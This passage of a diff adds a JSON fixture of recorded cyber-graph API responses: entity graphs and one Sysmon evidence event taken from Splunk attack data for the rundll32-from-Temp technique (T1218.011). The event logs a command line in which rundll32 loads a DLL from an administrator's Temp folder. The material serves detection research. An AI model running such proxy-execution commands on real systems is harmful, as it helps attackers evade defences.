+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-21899a05a0b6b23678fba60020129de8900a62bae140eacedc342d86e88cd30f",
+            "label": "PROCESS_ON_HOST",
+            "kind": "event",
+            "from": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "to": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          }
+        ],
+        "historical_replay": true,
+        "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+        "source": {
+          "source_id": "splunk-attack-data",
+          "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+          "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+          "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+          "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+          "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+        },
+        "window": {
+          "start": "",
+          "end": "",
+          "bucket_minutes": 0
+        },
+        "selected": [
+          "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085"
+        ],
+        "shared": [],
+        "depth": 1,
+        "scope": "all",
+        "focus": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085"
+      }
+    },
+    "graph-user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813": {
+      "path": "/api/cyber/graph/node?id=user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+      "status": 200,
+      "sha256": "86915373a7d5e5ced903388f843530a987fdb10ff272b3b7c73f3ffb9cc92c15",
+      "bytes": 16216,
+      "seconds": 1.582012666,
+      "retrieved_at": "2026-09-21T10:26:20.186774+00:00",
+      "body": {
+        "nodes": [
+          {
+            "id": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "label": "Event",
+            "name": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3",
+            "label": "Domain",
+            "name": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "domain_kind": "windows-account-domain",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "label": "Identity",
+            "name": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "label": "Process",
+            "name": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "process_creation"
+              ],
+              "process_guid": "e4b49a97-9768-6888-5f01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "label": "Event",
+            "name": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          },
+          {
+            "id": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "label": "Process",
+            "name": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "observation_roles": [
+                "process_creation"
+              ],
+              "process_guid": "e4b49a97-9761-6888-5c01-00000000f103",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              }
+            }
+          }
+        ],
+        "edges": [
+          {
+            "id": "edge-ef524b676434ba0cd6e6637efa43183900494d522e37bcf0ce5f392e7a42f525",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "to": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-40238d364e99eaabd4674aa8cb9e7c956d3c51c648b529e71a0da13b5ae9c121",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-fd1d6dba2217239265694a847a9394118afe71a726a5d23e7ebe893585781010",
+            "to": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-c3e11b45801292a7a613a1d4b2dcc531bb7e8e9c499243d0a39f536865241fcc",
+            "label": "MEMBER_OF_DOMAIN",
+            "kind": "event",
+            "from": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "to": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1",
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-f6c57683a7f0afe2d06b7cc8e81465e5d548775f5a656e6b9078642d7620fb73",
+            "label": "EXECUTED_AS",
+            "kind": "event",
+            "from": "process-eab39ca39ac2f8022881b5c11ad57a1bb6ccc2d94a6ed06cbe9ef23b69392085",
+            "to": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:42:00.175712200Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/1"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-e662d42ad3bec479d62f01889f7dc43494598ed0a2c37fbca21e9fc08f142ef8",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "to": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-84f72a6d368b792b2c652a9b7eab4385963a203ff4cf9437182992e36e74cd17",
+            "label": "EVIDENCES_ENTITY",
+            "kind": "event",
+            "from": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+            "to": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          },
+          {
+            "id": "edge-4ad5b0442580897b583035d6407b3ac29508404352d2277d3a2e97ebc4562ea2",
+            "label": "EXECUTED_AS",
+            "kind": "event",
+            "from": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "to": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813",
+            "event_count": 1,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:41:53.534035800Z",
+            "buckets": {},
+            "properties": {
+              "evidence_refs": [
+                "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2"
+              ],
+              "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+              "source": {
+                "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+                "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+                "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+                "source_id": "splunk-attack-data",
+                "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+                "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+              },
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61"
+            }
+          }
+        ],
+        "historical_replay": true,
+        "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+        "source": {
+          "source_id": "splunk-attack-data",
+          "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+          "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+          "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+          "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+          "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+        },
+        "window": {
+          "start": "",
+          "end": "",
+          "bucket_minutes": 0
+        },
+        "selected": [
+          "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+        ],
+        "shared": [],
+        "depth": 1,
+        "scope": "all",
+        "focus": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+      }
+    },
+    "event-2": {
+      "path": "/api/cyber/public/evidence?partition=scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61&resource_id=event%3A%2F%2Fscenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61%2F2",
+      "status": 200,
+      "sha256": "3df7b21c574c3ac860b9aea70266ca62d0b6bd27639531f2fc336caea180e67a",
+      "bytes": 3139,
+      "seconds": 0.797775842,
+      "retrieved_at": "2026-09-21T10:26:20.984711+00:00",
+      "body": [
+        {
+          "byte_length": 2020,
+          "byte_offset": 2037,
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "entity_refs": {
+            "domain": "domain-73df6c5637b12af4763beae5acef599d562063dba69aaba4379e93be509c88e3",
+            "host": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "parent_process": "process-aef8982a8968953166cb877ecb72da04bd04b11e7e412b1cdc4ba017d0f36951",
+            "process": "process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+            "user": "user-ca3a3292609b24080a277206250d8980784afe02dce972915ed792a27eaef813"
+          },
+          "event_id": "1",
+          "event_record_id": "62302",
+          "fields": {
+            "CommandLine": "rundll32.exe  C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\tmp12345.dll",
+            "Company": "Microsoft Corporation",
+            "CurrentDirectory": "C:\\Temp\\test\\",
+            "Description": "Windows host process (Rundll32)",
+            "FileVersion": "10.0.14393.4169 (rs1_release.210107-1130)",
+            "Hashes": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "IntegrityLevel": "High",
+            "LogonGuid": "{E4B49A97-9495-6888-9179-410000000000}",
+            "LogonId": "0x417991",
+            "OriginalFileName": "RUNDLL32.EXE",
+            "ParentCommandLine": "\"cmd.exe\" /s /k pushd \"C:\\Temp\\test\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentProcessGuid": "{E4B49A97-9749-6888-5A01-00000000F103}",
+            "ParentProcessId": "6124",
+            "ParentUser": "ATTACKRANGE\\Administrator",
+            "ProcessGuid": "{E4B49A97-9761-6888-5C01-00000000F103}",
+            "ProcessId": "1612",
+            "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+            "RuleName": "-",
+            "TerminalSessionId": "2",
+            "User": "ATTACKRANGE\\Administrator",
+            "UtcTime": "2025-07-29 09:41:53.533"
+          },
+          "host": "ar-win-dc.attackrange.local",
+          "id": "event-e2ed56cdc9be40434bddeb1764cab06fff6973296cc043811c0b27e9246a4067",
+          "kind": "event",
+          "label_status": "unlabelled",
+          "ordinal": 2,
+          "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
+          "provider": "Microsoft-Windows-Sysmon",
+          "raw_sha256": "f3ab0028793c1937b47413e99f83e92710c7e747806e927d2f1e6aba67a0c57d",
+          "resource_id": "event://scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61/2",
+          "source": {
+            "byte_length": 2020,
+            "byte_offset": 2037,
+            "commit": "6bc794b7f65562148c872fde1e7412ab3c173f4c",
+            "ordinal": 2,
+            "raw_sha256": "f3ab0028793c1937b47413e99f83e92710c7e747806e927d2f1e6aba67a0c57d",
+            "scenario_id": "76f9a94c-6c63-11f0-89ae-629be3538068",
+            "sha256": "5ac4747551f733d673cd6828a55732b7b542d3552698325cbdac2df2a69aa62f",
+            "source_id": "splunk-attack-data",
+            "source_path": "datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log",
+            "source_url": "https://media.githubusercontent.com/media/splunk/attack_data/6bc794b7f65562148c872fde1e7412ab3c173f4c/datasets/attack_techniques/T1218.011/rundll32_dll_in_temp/rundll32_tmp.log"
+          },
+          "timestamp": "2025-07-29T09:41:53.534035800Z",
+          "transform_version": "public-windows-v1",
+          "generation": "c9a96ffcdc3775b89685bac82f9941140b8dc2e724ce5f94442a838ab52e8e12",
+          "_rid": "7WsMANMFVoMEAAAAAAAAAA==",
+          "_self": "dbs/7WsMAA==/colls/7WsMANMFVoM=/docs/7WsMANMFVoMEAAAAAAAAAA==/",
+          "_etag": "\"01008bdd-0000-1a00-0000-6aafd6830000\"",
+          "_attachments": "attachments/",
+          "_ts": 1789908611
+        }
+      ]
+    },
+    "graph-process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0": {
+      "path": "/api/cyber/graph/node?id=process-debc91633f82e9b35263480d0e7bc2d5b6978cf0ecd876c2c7cb20a9d6aeb9d0",
+      "status": 200,
+      "sha256": "071e18cfbc3acc2ae21ba8ead47b8810f8f9a1ff234df7b1253ef2728c3a57e9",
+      "bytes": 15190,
+      "seconds": 1.771448235,
+      "retrieved_at": "2026-09-21T10:26:22.756295+00:00",
+      "body": {
+        "nodes": [
+          {
+            "id": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "label": "Host",
+            "name": "host-8ad334b33405df28941044492f9919e1d22879547fec00dcd42407667fe0900e",
+            "event_count": 2,
+            "first_seen": "2025-07-29T09:41:53.534035800Z",
+            "last_seen": "2025-07-29T09:42:00.175712200Z",
+            "properties": {
+              "partition": "scenario-eebb63e0e5ebfec669bbe6c36f036e1ad5769e279a95381b63a9b73e01ba8b61",
